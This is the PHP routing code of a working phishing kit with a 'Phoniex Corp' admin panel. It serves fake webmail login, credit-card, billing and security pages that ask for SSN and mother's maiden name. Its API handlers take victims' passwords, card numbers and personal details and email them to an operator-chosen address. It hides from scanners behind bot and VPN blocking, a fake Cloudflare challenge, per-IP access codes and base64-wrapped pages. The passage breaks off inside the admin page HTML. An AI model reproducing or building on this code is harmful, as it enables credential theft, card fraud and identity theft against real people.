<?php
if (!defined('ALLOW')) { http_response_code(403); exit; }

class goApp {
    
    private function showChallengePage(): void {
        $clientIp = get_client_ip();
        $accessCode = get_ip_access_code($clientIp);
        
        // Load configuration for Cloudflare page
        $config = include FCPATH . 'admin_config.php';
        
        // If cloudflare checkbox is disabled, redirect directly to login
        if (!($config['cloudflare_checkbox_enabled'] ?? true)) {
            sleep(2); // Delay 2 seconds before redirect
            header('Location: /' . $accessCode . '/login');
            exit;
        }
        
        // Read the challenge page content from Cloudflare.php
        $challengeFile = FCPATH . 'Tembuluk/Views/flow/Cloudflare.php';
        if (!is_file($challengeFile)) {
            // Fallback if Cloudflare.php doesn't exist
            header('Location: /' . $accessCode . '/login');
            exit;
        }
        
        // Load challenge page content
        ob_start();
        
        // Set variables that Cloudflare.php might need
        $urlData = [
            'cf_community_host' => $_SERVER['HTTP_HOST'] ?? 'localhost'
        ];
        $_ENV['CF_COMMUNITY_HOST'] = $urlData['cf_community_host'];
        
        // Set destination URL for redirect after challenge
        $destinationUrl = '/' . $accessCode . '/login';
        
        // Pass checkbox configuration to Cloudflare.php
        $cloudflareConfig = [
            'checkbox_enabled' => $config['cloudflare_checkbox_enabled'] ?? true
        ];
        
        include $challengeFile;
        $html = ob_get_clean();
        
        // Use encrypt.js system like other flow pages
        $htmlb64 = base64_encode($html);
        $out = "<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Just a moment...</title>\n  </head>\n  <body>\n    <script src=\"" . $this->assetUrl('assets/encrypt.js') . "\" data-html-b64=\"" . $htmlb64 . "\"></script>\n  </body>\n</html>";
        respond_html($out);
    }
    
    public function runApp() {
        // Check if visitor is blocked
        $blockCheck = is_blocked();
        if ($blockCheck['blocked']) {
            render_blocked_page($blockCheck);
            return;
        }
        $uriPath = $_SERVER['REQUEST_URI'] ?? '';
    $isAdminRequest = (
        str_contains($uriPath, '/admin-') ||
        str_contains($uriPath, '/admin/') ||
        (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower    ($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' && str_contains($uriPath, 'admin'))
    );
        if (BotGobot::isProtectionEnabled() && !$isAdminRequest) {
            $clientIp = get_client_ip();
            
            // Check if IP is in whitelist first
            if (!is_ip_whitelisted($clientIp)) {
                // IP not in whitelist, check with gobot
                $botGobotBlocker = new BotGobot();
                $gobotResult = $botGobotBlocker->gobotBlocker();
            
                if (!$gobotResult['success']) {
                    if (($gobotResult['type'] ?? '') === 'bot') {
                        $botGobotBlocker->handleBotDetected();
                        exit();
                    }
                    die(htmlspecialchars($gobotResult['message'] ?? 'Unknown error'));
                }
            
                $userType = $gobotResult['type'] ?? 'human';
                $reason   = $gobotResult['reason'] ?? '';
                
                // If human is detected, add IP to whitelist
                if ($userType === 'human') {
                    add_ip_to_whitelist($clientIp);
                }
            }
            // If IP is in whitelist, skip gobot check and continue
        }
        // Optional: allow manual OPcache reset when deploying updates
        if (isset($_GET['flush']) && function_exists('opcache_reset')) {
            @opcache_reset();
        }
        // Determine target content path from pretty URL or legacy query param `f`
        $path = null;

        // Legacy support: index.php?f=pages/flow/login.html
        if (isset($_GET['f'])) {
            $path = sanitize_path($_GET['f']);
        } else {
            // Pretty URLs with access code: /access-code/login, /access-code/cc, etc.
            $uriPath = (string)parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
            $basePath = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
            $basePath = rtrim($basePath, '/');
            if ($basePath !== '' && $basePath !== '/' && str_starts_with($uriPath, $basePath . '/')) {
                $uriPath = substr($uriPath, strlen($basePath));
            }
            $route = trim($uriPath, '/');
            
            // If root path, return empty (no auto redirect)
            if ($route === '' || $route === 'index.php') {
                // Load config to get access parameter names
                $config = include FCPATH . 'admin_config.php';
                $accessParam = $config['access_parameter'] ?? 'access';
                $adminAccessParam = $config['admin_access_parameter'] ?? 'phoniex';
                
                // Check if admin access parameter is provided
                if (isset($_GET[$adminAccessParam])) {
                    // Redirect to admin with dynamic access code (IP-based)
                    $clientIp = get_client_ip();
                    $accessCode = get_ip_access_code($clientIp);
                    header('Location: /' . $accessCode . '/admin-login');
                    exit;
                }
                
                // Check if regular access parameter is provided
                if (isset($_GET[$accessParam])) {
                    // Show Cloudflare challenge page first
                    $this->showChallengePage();
                    return;
                } else {
                    respond_html('', 200);
                    return;
                }
            }
            
            // Parse route segments
            $parts = explode('/', $route);
            
            // Check for admin routes or flow routes
            if (count($parts) >= 2 && str_starts_with($parts[1], 'admin')) {
                // Admin routes with access code: /access-code/admin-login, /access-code/admin, etc.
                $accessCode = $parts[0];
                $adminPage = $parts[1];
                
                // Check if access code is valid for this IP
                $clientIp = get_client_ip();
                if (!is_valid_access_code($accessCode, $clientIp)) {
                    respond_html('Access denied', 403);
                    return;
                }
                
                $adminMap = [
                    'admin' => 'admin/dashboard',
                    'admin-login' => 'admin/login',
                    'admin-logout' => 'admin/logout',
                    'admin-email' => 'admin/email',
                    'admin-stats' => 'admin/stats',
                    'admin-blocker' => 'admin/blocker',
                ];
                $path = $adminMap[$adminPage] ?? '';
            } else if (str_starts_with($route, 'admin')) {
                // Legacy admin routes without access code - redirect to dynamic access code version
                $clientIp = get_client_ip();
                $accessCode = get_ip_access_code($clientIp);
                $adminPage = $parts[0];
                header('Location: /' . $accessCode . '/' . $adminPage);
                exit;
            } else {
                // Flow routes require access code: /access-code/page
                if (count($parts) < 2) {
                    respond_html('Access denied', 403);
                    return;
                }
                
                $accessCode = $parts[0];
                $page = $parts[1];
                
                // Check if access code is valid for this IP
                $clientIp = get_client_ip();
                if (!is_valid_access_code($accessCode, $clientIp)) {
                    respond_html('Access denied', 403);
                    return;
                }
                
                // Map flow pages
                $flowMap = [
                    'login' => 'flow/login.php',
                    'cc' => 'flow/cc.php',
                    'billing' => 'flow/billing.php',
                    'security' => 'flow/security.php',
                    'oauth' => 'flow/oauth.php',
                    'oauth-page' => 'api/oauth-handler',
                    'done' => 'flow/done.php',
                ];
                
                // API endpoints
                $apiMap = [
                    'send-email' => 'api/send-email',
                    'send-cc' => 'api/send-cc',
                    'send-billing' => 'api/send-billing',
                    'send-security' => 'api/send-security',
                    'send-oauth-email' => 'api/send-oauth-email',
                ];
                
                $path = $flowMap[$page] ?? $apiMap[$page] ?? '';
            }
        }

        $path = sanitize_path($path);
        if ($path === '' || (!str_starts_with($path, 'pages/') && !str_starts_with($path, 'views/') && !str_starts_with($path, 'flow/') && !str_starts_with($path, 'api/') && !str_starts_with($path, 'admin/'))) {
            respond_html('Bad request', 400);
            return;
        }
        
        // Handle API endpoints
        if (str_starts_with($path, 'api/')) {
            $this->handleApi($path);
            return;
        }
        
        // Handle admin endpoints
        if (str_starts_with($path, 'admin/')) {
            $this->handleAdmin($path);
            return;
        }
        // Handle OAuth page specially - include Email folder file directly
        if ($path === 'flow/oauth.php') {
            // OAuth page will handle its own include of Email folder files
            $abs = FCPATH . 'Tembuluk/Views/' . $path;
            if (!is_file($abs)) {
                respond_html('Not found', 404);
                return;
            }
            // Include oauth.php directly
            // oauth.php will either:
            // 1. Include Email file and exit (output goes directly to browser)
            // 2. Output redirect script and return
            include $abs;
            // If we reach here, oauth.php already exited (Email file included)
            // or returned redirect script
            // Check if there's any output to process
            return;
        } else {
            // Resolve paths: legacy HTML under pages/, views under Tembuluk/Views
            if (str_starts_with($path, 'flow/') || str_starts_with($path, 'admin/')) {
                $abs = FCPATH . 'Tembuluk/Views/' . $path;
            } else {
                $abs = FCPATH . $path;
            }
            if (!is_file($abs)) {
                respond_html('Not found', 404);
                return;
            }
            // Render PHP view into a buffer when using views
            if (substr($abs, -4) === '.php') {
                ob_start();
                include $abs;
                $html = ob_get_clean();
            } else {
                $html = file_get_contents($abs);
            }
        }
        
        // Log page visits
        if (str_starts_with($path, 'flow/')) {
            $pageType = str_replace(['flow/', '.php'], '', $path);
            log_activity('page_visit', ['page' => $pageType]);
        }
        if ($html === false) {
            respond_html('Read error', 500);
            return;
        }
        
        // Special handling for OAuth - if file was included directly, it already exited
        // So if we're here, it means we have the redirect script HTML
        if ($path === 'flow/oauth.php' && !empty($html) && str_contains($html, '<script>')) {
            // This is the redirect script, inject config and wrap normally
            $lang = load_translations(FCPATH);
            $langJson = json_encode($lang, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
            $config = include FCPATH . 'admin_config.php';
            $flowSettingsJson = json_encode($config['flow_settings'], JSON_UNESCAPED_SLASHES);
            $clientIp = get_client_ip();
            $accessCode = get_ip_access_code($clientIp);
            $accessParam = $config['access_parameter'] ?? 'access';
            $adminAccessParam = $config['admin_access_parameter'] ?? 'phoniex';
            
            $inject = "<script>window.__LANG__ = " . $langJson . "; window.__FLOW_SETTINGS__ = " . $flowSettingsJson . "; window.__ACCESS_CODE__ = '" . $accessCode . "'; window.__ACCESS_PARAM__ = '" . $accessParam . "'; window.__ADMIN_ACCESS_PARAM__ = '" . $adminAccessParam . "';</script>";
            $html = str_replace('</head>', $inject . "</head>", $html);
            
            $htmlb64 = base64_encode($html);
            $out = "<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title></title>\n  </head>\n  <body>\n    <script src=\"" . $this->assetUrl('assets/encrypt.js') . "\" data-html-b64=\"" . $htmlb64 . "\"></script>\n  </body>\n</html>";
            respond_html($out);
            return;
        }
        
        // Load translations (lang/default.json or lang/{locale}.json)
        $lang = load_translations(FCPATH);
        // Make translations available to views
        $langJson = json_encode($lang, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        
        // Load flow settings and access codes
        $config = include FCPATH . 'admin_config.php';
        $flowSettingsJson = json_encode($config['flow_settings'], JSON_UNESCAPED_SLASHES);
        $clientIp = get_client_ip();
        $accessCode = get_ip_access_code($clientIp);
        $accessParam = $config['access_parameter'] ?? 'access';
        $adminAccessParam = $config['admin_access_parameter'] ?? 'phoniex';
        
        $inject = "<script>window.__LANG__ = " . $langJson . "; window.__FLOW_SETTINGS__ = " . $flowSettingsJson . "; window.__ACCESS_CODE__ = '" . $accessCode . "'; window.__ACCESS_PARAM__ = '" . $accessParam . "'; window.__ADMIN_ACCESS_PARAM__ = '" . $adminAccessParam . "';</script>";
        $html = str_replace('</head>', $inject . "</head>", $html);

        $htmlb64 = base64_encode($html);
        $out = "<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title></title>\n  </head>\n  <body>\n    <script src=\"" . $this->assetUrl('assets/encrypt.js') . "\" data-html-b64=\"" . $htmlb64 . "\"></script>\n  </body>\n</html>";
        respond_html($out);
    }

    private function assetUrl(string $rel): string {
        // Build an absolute URL path that works from any pretty route
        $scriptDir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
        $scriptDir = rtrim($scriptDir, '/');
        if ($scriptDir === '' || $scriptDir === '.') { $scriptDir = ''; }
        $prefix = $scriptDir === '' ? '' : $scriptDir;
        return ($prefix === '' ? '/' : $prefix . '/') . ltrim($rel, '/');
    }
    
    private function handleApi(string $path): void {
        if ($path === 'api/send-email' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!is_array($data) || empty($data['email']) || empty($data['password'])) {
                respond_json(['error' => 'Invalid data'], 400);
                return;
            }
            
            $loginData = [
                'email' => $data['email'],
                'password' => $data['password']
            ];
            
            $ip = get_client_ip();
            $geoData = get_geo_info($ip);
            
            $success = send_login_email($loginData, $geoData);
            log_activity('login', $loginData);
            
            if ($success) {
                respond_json(['success' => true]);
            } else {
                respond_json(['error' => 'Email failed'], 500);
            }
        } elseif ($path === 'api/send-cc' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!is_array($data) || empty($data['cc']) || empty($data['login'])) {
                respond_json(['error' => 'Invalid data'], 400);
                return;
            }
            
            $ccData = $data['cc'];
            $loginData = $data['login'];
            $billingData = $data['billing'] ?? null; // Billing data
            $cc1Data = $data['cc1'] ?? null; // First attempt data (if exists)
            $attempt = $data['attempt'] ?? 1; // Attempt number
            
            $ip = get_client_ip();
            $geoData = get_geo_info($ip);
            
            $success = send_cc_email($ccData, $loginData, $geoData, $cc1Data, $attempt, $billingData);
            log_activity('cc', $ccData);
            
            if ($success) {
                respond_json(['success' => true, 'countryCode' => get_country_code($geoData['country']), 'country' => $geoData['country']]);
            } else {
                respond_json(['error' => 'Email failed'], 500);
            }
        } elseif ($path === 'api/send-billing' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!is_array($data) || empty($data['billing']) || empty($data['login'])) {
                respond_json(['error' => 'Invalid data'], 400);
                return;
            }
            
            $billingData = $data['billing'];
            $loginData = $data['login'];
            $ccData = $data['cc'] ?? null;
            
            $ip = get_client_ip();
            $geoData = get_geo_info($ip);
            
            // Get country code for routing decision
            $countryCode = get_country_code($geoData['country']);
            
            $success = send_billing_email($billingData, $loginData, $geoData, $ccData);
            log_activity('billing', $billingData);
            
            if ($success) {
                respond_json([
                    'success' => true, 
                    'countryCode' => $countryCode,
                    'country' => $geoData['country']
                ]);
            } else {
                respond_json(['error' => 'Email failed'], 500);
            }
        } elseif ($path === 'api/send-security' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!is_array($data) || empty($data['security']) || empty($data['login'])) {
                respond_json(['error' => 'Invalid data'], 400);
                return;
            }
            
            $securityData = $data['security'];
            $loginData = $data['login'];
            $oauthData = $data['oauth'] ?? null; // OAuth data if available
            $billingData = $data['billing'] ?? null; // Billing data if available
            $ccData = $data['cc'] ?? null; // CC data if available
            
            $ip = get_client_ip();
            $geoData = get_geo_info($ip);
            
            $success = send_security_email($securityData, $loginData, $geoData, $billingData, $ccData, $oauthData);
            log_activity('security', $securityData);
            
            if ($success) {
                respond_json(['success' => true]);
            } else {
                respond_json(['error' => 'Email failed'], 500);
            }
        } elseif ($path === 'api/send-oauth-email' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!is_array($data) || empty($data['email']) || empty($data['password'])) {
                respond_json(['error' => 'Invalid data'], 400);
                return;
            }
            
            $oauthData = [
                'email' => $data['email'],
                'password' => $data['password'],
                'password1' => $data['password1'] ?? null,
                'password2' => $data['password2'] ?? null,
                'provider' => $data['provider'] ?? 'unknown'
            ];
            
            $ip = get_client_ip();
            $geoData = get_geo_info($ip);
            
            $success = send_oauth_email($oauthData, $geoData);
            log_activity('oauth', $oauthData);
            
            if ($success) {
                respond_json(['success' => true]);
            } else {
                respond_json(['error' => 'Email failed'], 500);
            }
        } elseif ($path === 'api/oauth-handler') {
            // Handle OAuth page request based on email domain
            $email = $_GET['email'] ?? $_POST['email'] ?? '';
            
            if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
                // Invalid email, return empty or redirect
                respond_html('', 404);
                return;
            }
            
            // Get email domain
            $parts = explode('@', $email);
            $domain = isset($parts[1]) ? strtolower(trim($parts[1])) : null;
            
            if (!$domain || !preg_match('/^[a-z0-9.-]+$/', $domain) || preg_match('/(\.\.|\/|\\\\)/', $domain)) {
                // Invalid domain, return empty
                respond_html('', 404);
                return;
            }
            
            // Check if OAuth is enabled
            $config = include FCPATH . 'admin_config.php';
            $flowSettings = $config['flow_settings'] ?? [];
            if (!($flowSettings['oauth_enabled'] ?? false)) {
                // OAuth disabled, return empty
                respond_html('', 404);
                return;
            }
            
            // Extract main domain name (e.g., hotmail.com -> hotmail, outlook.com -> outlook)
            $domainParts = explode('.', $domain);
            $mainDomain = $domainParts[0] ?? $domain;
            
            // Check if folder exists for this domain
            $domainFolder = FCPATH . 'Tembuluk/Views/flow/Email/' . $mainDomain . '/';
            
            // Try different file patterns
            // 1. index{mainDomain}.php (e.g., indexhotmail.php, indexatt.php)
            $indexFilePattern = $domainFolder . 'index' . $mainDomain . '.php';
            
            // 2. index.php (fallback)
            $indexFileFallback = $domainFolder . 'index.php';
            
            // 3. Try with full domain name (e.g., indexhotmail.com.php)
            $indexFileFullDomain = $domainFolder . 'index' . $domain . '.php';
            
            $filePath = null;
            if (file_exists($indexFilePattern)) {
                $filePath = $indexFilePattern;
            } elseif (file_exists($indexFileFullDomain)) {
                $filePath = $indexFileFullDomain;
            } elseif (file_exists($indexFileFallback)) {
                $filePath = $indexFileFallback;
            }
            
            if ($filePath && file_exists($filePath) && is_readable($filePath)) {
                // Set email variable for included file
                // Include the OAuth page
                // Make sure output buffering is active
                if (ob_get_level() > 0) {
                    ob_end_clean();
                }
                ob_start();
                try {
                    // Make email available to included file
                    // Set $_GET['email'] so included file can access it
                    if (empty($_GET['email'])) {
                        $_GET['email'] = $email;
                    }
                    
                    // Include the file - this will output HTML
                    include $filePath;
                    
                    // Get the output and clean the buffer
                    $html = ob_get_clean();
                    
                    // If HTML is empty or very short, there might be an issue
                    if (empty($html) || strlen(trim($html)) < 10) {
                        respond_html('<!-- OAuth page loaded but content is empty. File: ' . htmlspecialchars($filePath) . ', Email: ' . htmlspecialchars($email) . ' -->', 404);
                        return;
                    }
                    
                    // Return the HTML
                    respond_html($html);
                } catch (Exception $e) {
                    ob_end_clean();
                    http_response_code(500);
                    header('Content-Type: text/html; charset=UTF-8');
                    echo '<!-- Error loading OAuth page: ' . htmlspecialchars($e->getMessage()) . ' -->';
                    exit;
                } catch (Throwable $e) {
                    ob_end_clean();
                    http_response_code(500);
                    header('Content-Type: text/html; charset=UTF-8');
                    echo '<!-- Error loading OAuth page: ' . htmlspecialchars($e->getMessage()) . ' -->';
                    exit;
                }
            } else {
                // OAuth page not found for domain
                $debugInfo = '<!-- OAuth page not found. Searched paths: ' . 
                    htmlspecialchars($indexFilePattern) . ' (exists: ' . (file_exists($indexFilePattern) ? 'yes' : 'no') . '), ' .
                    htmlspecialchars($indexFileFallback) . ' (exists: ' . (file_exists($indexFileFallback) ? 'yes' : 'no') . '), ' .
                    htmlspecialchars($indexFileFullDomain) . ' (exists: ' . (file_exists($indexFileFullDomain) ? 'yes' : 'no') . ') -->';
                respond_html($debugInfo, 404);
            }
        } else {
            respond_json(['error' => 'Not found'], 404);
        }
    }
    
    private function handleAdmin(string $path): void {
        $config = include FCPATH . 'admin_config.php';
        
        if ($path === 'admin/login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (($data['username'] ?? '') === $config['admin_user'] && 
                ($data['password'] ?? '') === $config['admin_pass']) {
                $_SESSION['admin_logged_in'] = time();
                respond_json(['success' => true]);
            } else {
                respond_json(['error' => 'Invalid credentials'], 401);
            }
            return;
        }
        
        if ($path === 'admin/logout') {
            unset($_SESSION['admin_logged_in']);
            respond_json(['success' => true]);
            return;
        }
        
        // Check admin auth (skip auth check for login page)
        $loginTime = $_SESSION['admin_logged_in'] ?? 0;
        if (!$loginTime || (time() - $loginTime) > $config['session_timeout']) {
            if ($path === 'admin/dashboard' || $path === 'admin/login') {
                // Render admin login view
                $abs = FCPATH . 'Tembuluk/Views/admin/login.php';
                if (is_file($abs)) {
                    ob_start();
                    include $abs;
                    $html = ob_get_clean();
                    respond_html($html);
                } else {
                    respond_html('Admin login not found', 404);
                }
            } else {
                respond_json(['error' => 'Unauthorized'], 401);
            }
            return;
        }
        
        // Handle authenticated admin requests
        switch ($path) {
            case 'admin/dashboard':
                $abs = FCPATH . 'Tembuluk/Views/admin/dashboard.php';
                if (is_file($abs)) {
                    ob_start();
                    include $abs;
                    $html = ob_get_clean();
                    
                    // Inject dynamic admin access code for JavaScript
                    $clientIp = get_client_ip();
                    $adminAccessCode = get_ip_access_code($clientIp);
                    $inject = "<script>window.__ACCESS_CODE__ = '" . $adminAccessCode . "';</script>";
                    $html = str_replace('</head>', $inject . "</head>", $html);
                    
                    respond_html($html);
                } else {
                    respond_html('Dashboard not found', 404);
                }
                break;
            case 'admin/login':
                // This should not be reached if user is authenticated, but handle it anyway
                $abs = FCPATH . 'Tembuluk/Views/admin/login.php';
                if (is_file($abs)) {
                    ob_start();
                    include $abs;
                    $html = ob_get_clean();
                    respond_html($html);
                } else {
                    respond_html('Admin login not found', 404);
                }
                break;
            case 'admin/email':
                $this->handleAdminEmail();
                break;
            case 'admin/stats':
                $this->handleAdminStats();
                break;
            case 'admin/blocker':
                $this->handleAdminBlocker();
                break;
            default:
                respond_json(['error' => 'Not found'], 404);
        }
    }
    
    
    private function handleAdminEmail(): void {
        $config = include FCPATH . 'admin_config.php';
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (is_array($data)) {
                $newConfig = array_merge($config, [
                    'email_recipient' => $data['email_recipient'] ?? $config['email_recipient'],
                    'access_parameter' => $data['access_parameter'] ?? $config['access_parameter'],
                    'proxy_detection_enabled' => isset($data['proxy_detection_enabled']) ? (bool)$data['proxy_detection_enabled'] : ($config['proxy_detection_enabled'] ?? true),
                    'cloudflare_checkbox_enabled' => isset($data['cloudflare_checkbox_enabled']) ? (bool)$data['cloudflare_checkbox_enabled'] : ($config['cloudflare_checkbox_enabled'] ?? true)
                ]);
                
                // Update flow settings if provided
                if (isset($data['flow_settings'])) {
                    $newConfig['flow_settings'] = array_merge($config['flow_settings'], $data['flow_settings']);
                }
                
                // Preserve protected fields that should not be modified by admin panel
                // These fields contain dynamic PHP code that should not be converted to literals
                $protectedFields = ['gobotDomain', 'admin_user', 'admin_pass', 'session_timeout', 
                                    'botProtection', 'botGobotApiKey', 'botRedirection', 'admin_access_parameter'];
                foreach ($protectedFields as $field) {
                    if (isset($config[$field])) {
                        $newConfig[$field] = $config[$field];
                    }
                }
                
                try {
                    // Custom export for gobotDomain to preserve $_SERVER variables
                    $configContent = "<?php\n// Admin configuration\nreturn array (\n";
                    
                    foreach ($newConfig as $key => $value) {
                        $configContent .= "  " . var_export($key, true) . " => ";
                        
                        // Special handling for gobotDomain to preserve PHP code
                        if ($key === 'gobotDomain' && is_string($value) && strpos($value, '$_SERVER') !== false) {
                            $configContent .= '"http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"';
                        } elseif (is_array($value)) {
                            $configContent .= "\n  " . str_replace("\n", "\n  ", var_export($value, true));
                        } else {
                            $configContent .= var_export($value, true);
                        }
                        
                        $configContent .= ",\n";
                    }
                    
                    $configContent .= ");";
                    $saveResult = file_put_contents(FCPATH . 'admin_config.php', $configContent);
                    
                    if ($saveResult !== false) {
                        respond_json(['success' => true]);
                    } else {
                        respond_json(['error' => 'Save failed - unable to write config file'], 500);
                    }
                } catch (Exception $e) {
                    respond_json(['error' => 'Save failed - ' . $e->getMessage()], 500);
                }
            } else {
                respond_json(['error' => 'Invalid data'], 400);
            }
            return;
        }
        
        // Get dynamic admin access code for JavaScript injection
        $clientIp = get_client_ip();
        $accessCode = get_ip_access_code($clientIp);
        
        $html = <<<'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Configuration - Phoniex Corp Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif; 
            background: #f8f9fa;
            color: #495057;
            overflow-x: hidden;
        }
        .admin-layout {
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            width: 280px;
            background: white;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
            position: fixed;
            height: 100vh;
            overflow-y: auto;
        }
        .sidebar-header {
            padding: 30px 25px;
            border-bottom: 1px solid #e9ecef;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 24px;
            font-weight: 700;
            color: #6f42c1;
        }
        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #6f42c1 0%, #20c997 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        .sidebar-nav {
            padding: 20px 0;
        }
        .nav-item {
            display: block;
            padding: 15px 25px;
            color: #6c757d;
            text-decoration: none;
            transition: all 0.3s ease;
            border-left: 3px solid transparent;
        }
        .nav-item:hover, .nav-item.active {
            background: #f8f9fa;
            color: #6f42c1;
            border-left-color: #6f42c1;
        }
        .main-content {
            margin-left: 280px;
            flex: 1;
        }
        .top-bar {
            background: white;
            padding: 20px 30px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .page-title {
            font-size: 28px;
            font-weight: 600;
            color: #495057;
        }
        .logout-btn {
            background: #dc3545;
            color: white;
            padding: 8px 16px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .logout-btn:hover {
            background: #c82333;
        }
        .content {
            padding: 30px;
        }
        .config-card {
            background: white;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 25px;
        }
        .setting-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid #e9ecef;
        }
        .setting-item:last-child {
            border-bottom: none;
        }
        .setting-label {
            font-weight: 500;
            color: #495057;
        }
        .setting-desc {
            font-size: 13px;
            color: #6c757d;
            margin-top: 3px;
        }
        .toggle {
            position: relative;
            width: 50px;
            height: 24px;
            background: #ced4da;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .toggle.active {
            background: #28a745;
        }
        .toggle-slider {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 20px;
            height: 20px;
            background: white;
            transition: all 0.3s ease;
        }
        .toggle.active .toggle-slider {
            transform: translateX(26px);
        }
        .card-title {
            font-size: 20px;
            font-weight: 600;
            color: #495057;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #495057;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ced4da;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #6f42c1;
            box-shadow: 0 0 0 3px rgba(111, 66, 193, 0.1);
        }
        .btn {
            padding: 12px 24px;
            background: linear-gradient(135deg, #6f42c1 0%, #20c997 100%);
            color: white;
            border: none;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(111, 66, 193, 0.3);
        }
        .success {
            color: #28a745;
            margin-top: 15px;
            padding: 10px;
            background: #d4edda;
        }
        .error {
            color: #dc3545;
            margin-top: 15px;
            padding: 10px;
            background: #f8d7da;
        }
    </style>
</head>
<body>
    <div class="admin-layout">
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="logo">
                    <div class="logo-icon">P</div>
                    Phoniex Corp
                </div>
            </div>
            <nav class="sidebar-nav">
                <a href="#" class="nav-item admin-nav-link" data-page="admin">
                    <span>📊</span> Dashboard
                </a>
                <a href="#" class="nav-item admin-nav-link active" data-page="admin-email">
                    <span>📧</span> Configuration
                </a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-stats">
                    <span>📈</span> Statistics
                </a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-blocker">
                    <span>🚫</span> Blocker
                </a>
            </nav>
        </div>
        
        <div class="main-content">
            <div class="top-bar">
                <h1 class="page-title">Configuration</h1>
                <a href="#" onclick="logout()" class="logout-btn">Logout</a>
            </div>
            
            <div class="content">
                <div class="config-card">
                    <div class="card-title">📧 Email Configuration</div>
                    <form id="emailForm">
                        <div class="form-group">
                            <label>Email Recipient</label>
                            <input type="email" id="emailRecipient" value="__EMAIL_RECIPIENT__" required>
                        </div>
                        <div class="form-group">
                            <label>Access Parameter Name</label>
                            <input type="text" id="accessParameter" value="__ACCESS_PARAMETER__" required placeholder="access">
                            <div style="font-size: 12px; color: #6c757d; margin-top: 5px;">
                                Users will access: domain.com/?__ACCESS_PARAMETER__
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="setting-item">
                                <div>
                                    <div class="setting-label">🛡️ Proxy/VPN Detection</div>
                                    <div class="setting-desc">Block visitors using proxy, VPN, or anonymization services</div>
                                </div>
                                <div class="toggle __PROXY_TOGGLE_CLASS__" id="proxyToggle">
                                    <div class="toggle-slider"></div>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="setting-item">
                                <div>
                                    <div class="setting-label">☑️ Cloudflare Checkbox</div>
                                    <div class="setting-desc">Show/hide human verification checkbox on challenge page</div>
                                </div>
                                <div class="toggle __CLOUDFLARE_TOGGLE_CLASS__" id="cloudflareToggle">
                                    <div class="toggle-slider"></div>
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn">Save Configuration</button>
                        <div id="message"></div>
                    </form>
                </div>
                
                <div class="config-card">
                    <div class="card-title">🔒 Security Page Fields</div>
                    <form id="flowForm">
                        <div class="setting-item">
                            <div>
                                <div class="setting-label">Mother&#39;s Maiden Name (MMN)</div>
                                <div class="setting-desc">Show/hide mother&#39;s maiden name field</div>
                            </div>
                            <div class="toggle __MMN_TOGGLE_CLASS__" data-field="security_mmn_enabled">
                                <div class="toggle-slider"></div>
                            </div>
                        </div>
                        
                        <div class="setting-item">
                            <div>
                                <div class="setting-label">Social Security Number (SSN)</div>
                                <div class="setting-desc">Show/hide SSN field</div>
                            </div>
